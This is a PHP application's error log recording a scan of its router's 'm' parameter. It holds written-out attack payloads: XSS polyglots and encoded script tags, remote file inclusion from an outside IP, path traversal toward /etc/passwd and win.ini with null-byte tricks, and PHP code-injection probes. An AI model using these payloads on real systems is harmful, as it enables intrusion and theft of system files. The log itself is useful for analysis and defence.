<?php
 die();
?>

05:01:33 ERROR: the control file module/javascript:/*-/*`/*\`/*'/*"/**/(/* */onclick=alert() )//

//
05:04:33 ERROR: the control file module/phnjcmlwdd5hbgvydcgxktwvc2nyaxb0pg==/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&f=browse&root=1&branch=&type=byModule&param=12

05:05:11 ERROR: the control file module/amf2yxnjcmlwddpwcm9tchqomtexktt4/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=amF2YXNjcmlwdDpwcm9tcHQoMTExKTt4&f=browse&root=1&branch=&type=byModule&param=12

05:06:27 ERROR: the control file module/bugi2027381i/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=bugi2027381i&f=browse&root=1&branch=&type=byModule&param=12

05:06:33 ERROR: the control file module/http://120.26.55.211/s.txt/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=http://120.26.55.211/s.txt&f=browse&root=1&branch=&type=byModule&param=12

05:06:57 ERROR: the control file module/http://120.26.55.211/s.txt/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=http%3A%2F%2F120.26.55.211%2Fs.txt&f=browse&root=1&branch=&type=byModule&param=12

05:07:20 ERROR: the control file module/a_long_name_file_not_exist/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=a_long_name_file_not_exist&f=browse&root=1&branch=&type=byModule&param=12

05:07:57 ERROR: the control file module//etc/passwd/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=%2Fetc%2Fpasswd&f=browse&root=1&branch=&type=byModule&param=12

05:08:37 ERROR: the control file module/c://windows/win.ini/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=c%3A%2F%2Fwindows%2Fwin.ini&f=browse&root=1&branch=&type=byModule&param=12

05:14:52 ERROR: the control file module/../../../../../../../../etc/passwd/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&f=browse&root=1&branch=&type=byModule&param=12

05:15:59 ERROR: the control file module/../../../../../../../../windows/win.ini/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini&f=browse&root=1&branch=&type=byModule&param=12

05:16:31 ERROR: the control file module/../../../../../../../../../../etc/passwd%00/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500&f=browse&root=1&branch=&type=byModule&param=12

05:17:04 ERROR: the control file module/../../../../../../../../../../windows/win.ini00/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini00&f=browse&root=1&branch=&type=byModule&param=12

05:17:29 is_file() expects parameter 1 to be a valid path, string given in framework/router.class.php on line 990 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.jpg&f=browse&root=1&branch=&type=byModule&param=12

05:17:29 ERROR: the control file module/../../../../../../../../etc/passwd in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.jpg&f=browse&root=1&branch=&type=byModule&param=12

05:18:04 is_file() expects parameter 1 to be a valid path, string given in framework/router.class.php on line 990 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%00.jpg&f=browse&root=1&branch=&type=byModule&param=12

05:18:04 ERROR: the control file module/../../../../../../../../windows/win.ini in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%00.jpg&f=browse&root=1&branch=&type=byModule&param=12

05:18:37 ERROR: the control file module/../../../../../../../../etc/passwd
.jpg/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%0a.jpg&f=browse&root=1&branch=&type=byModule&param=12

05:19:57 ERROR: the control file module/../../../../../../../../windows/win.ini
.jpg/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%0a.jpg&f=browse&root=1&branch=&type=byModule&param=12

05:21:26 ERROR: the control file module/${@print(md5(this_is_a_test_string))}/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D&f=browse&root=1&branch=&type=byModule&param=12

05:21:57 ERROR: the control file module/${@print(md5(this_is_a_test_string))}\/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D%5C&f=browse&root=1&branch=&type=byModule&param=12

05:22:30 ERROR: the control file module/print(md5(this_is_a_test_string));die();/*/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=print%28md5%28this_is_a_test_string%29%29%3Bdie%28%29%3B%2F*&f=browse&root=1&branch=&type=byModule&param=12

05:26:29 ERROR: the control file module/bug'">/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=bug'%22%3E%3Ciframe%20onload=alert()%3E&f=browse&root=1&branch=&type=byModule&param=12

05:27:06 ERROR: the control file module/bug'">/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=bug'%22%3E%3Cimg%20src=x%20onerror=prompt()%3E&f=browse&root=1&branch=&type=byModule&param=12

05:28:36 ERROR: the control file module/bug'">/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=bug'%22%3E%3Csvg%20onload=prompt()%3E&f=browse&root=1&branch=&type=byModule&param=12
